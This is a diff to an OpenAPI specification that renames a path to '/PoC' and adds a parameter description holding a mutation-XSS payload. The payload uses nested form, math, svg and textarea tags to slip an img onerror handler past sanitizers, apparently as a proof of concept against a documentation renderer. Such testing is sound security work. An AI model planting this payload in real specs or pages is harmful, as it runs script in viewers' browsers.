@@ -15,8 +15,11 @@ consumes:
 security:
   - basicAuth: []
 paths:
-  /XSS:
+  /PoC:
     get:
+      parameters:
+        - description: |
+            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea><img src=x onerror=alert(document.domain)>"></form>
       responses:
         '200':
           description: No response was specified
